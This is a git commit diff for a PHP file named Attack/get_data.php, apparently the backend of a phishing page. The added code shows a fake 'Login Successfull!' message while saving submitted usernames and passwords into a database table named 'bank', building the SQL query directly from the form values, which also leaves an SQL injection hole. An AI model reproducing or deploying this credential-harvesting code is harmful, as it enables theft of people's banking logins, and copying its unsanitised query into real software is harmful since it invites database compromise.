ca5bef1a5a34d400271af6a7904e91dd13df20bc
nerov103 <nibir01000@gmail.com>
2024-03-11 22:40:09 +0600

    something chnage

--- Attack/get_data.php
+++ Attack/get_data.php
@@ -1,15 +1,15 @@
+<!-- this is one line html code -->
+<h1 style="text-align: center;color: green;">Login Successfull!</h1>
+
 <?php
 //write code....
 //start the coding
+require_once "database.php";
+$n = $_POST['name'];
+$p = $_POST['password'];
 
-$name = $_POST['name'];
-$password = $_POST['password'];
-
-//print the webpage
-echo $name;
-echo $password;
-
-
+$sql = "INSERT INTO `bank`(`Username`, `Password`) VALUES ('$n','$p')";
+mysqli_query($all_data, $sql)
 
 
 ?>
